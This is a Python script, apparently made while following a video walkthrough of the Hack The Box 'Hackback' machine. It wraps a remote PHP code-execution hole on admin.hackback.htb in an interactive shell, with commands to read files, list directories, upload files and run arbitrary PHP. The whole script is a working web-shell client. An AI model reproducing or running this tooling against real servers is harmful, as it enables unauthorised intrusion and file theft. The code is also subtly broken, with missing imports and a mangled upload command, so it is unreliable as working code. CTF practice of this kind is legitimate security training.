#!/usr/bin/python3

#script from hackback video, make get request from command line.
#ippsec hackback video ~ 50 min
import requests
from cmd import Cmd

class Terminal(Cmd):
	prompt = '$ => '

	def __init__(self):
		# Todo:
		## Run test command, if test fails
		super().__init__()
		
	def do_cat(self, args):
		# Todo
		## Error: unicodedecodeerror: 'utf-8' codec cant decode byte 0x80 in position 99: invalyd start byte.
		command = f'echo(base64_encode(file_get_contents("{args}")));'
		print(run_php(command))
		
	def do_ls(self,args):
		command = 'foreach (scandir("' + args + '") as $filename) { $x .= $filename."\\n"; }; echo(base64_encode($x));'
		print(run_php(command))
		
	# UPLOAD SRC DST
	def do_upload(self, args):
		source, destination = args.split(' ')
		
		with open(source, 'r') as handle:
			for line in handle:
				b64_line = b64encode(str.encode(line))
				b64_line = b64_line.decode('utf-8')
				command = f"$fp = fopen('{destination}'.'a');"
				command += f"fwrite($fp, base64)decode('{b64_line}'));"
				print(command)
				run_php(command)
					
	def do_raw(self,args):
		#Todo:
		## Have this base64 encode output
		print(run_php(args))
		
def parse_response(page):
	page = page.decode('utf-8')
	m = re.search('SSSTART(.+?)EEEND', page)
	if m:
		return b64decode(m.group(1)).decode('utf-8')
	else:
		return 1
		
def run_php(php_code):
	# ToDo
	## grab session id at start of the program
	url = 'http://admin.hackback.htb//asdaflsdkjf/webadmin.php'
	params = { 'action':'show',
			'site':'hackthebox',
			'password':'12345678',
			'session':'24l3kjflsdkjafdklj23lk4jkl',
			'ippsec': b64encode(str.encode(php_code)) }
	proxies = { 'http' : 'http://localhost:8080' }
	r = requests.get(url, params=params, proxies=proxies, allow_redirects=False)
	return parse_response(r.content)
	
term = Terminal()
term.cmdloop()

	
